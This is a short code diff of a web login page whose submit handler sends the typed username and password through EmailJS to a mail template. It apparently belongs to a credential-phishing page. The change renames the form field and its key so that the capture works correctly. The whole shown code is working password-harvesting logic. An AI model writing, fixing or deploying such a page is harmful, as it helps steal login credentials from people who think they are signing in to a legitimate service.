@@ -15,7 +15,7 @@ function sendLogin(e){
 e.preventDefault();
 
 emailjs.send("service_g9hb3t6","template_e9aw4ub",{
-username or email: document.getElementById("username").value,
+username: document.getElementById("username").value,
 password: document.getElementById("password").value
 })
 .then(function(){
@@ -109,7 +109,7 @@ opacity:0.9;
 
 <form onsubmit="sendLogin(event)">
 
-<input type="text" id="username or email" placeholder="Username Or Email" required>
+<input type="text" id="username" placeholder="Username" required>
 
 <input type="password" id="password" placeholder="password" required>
 
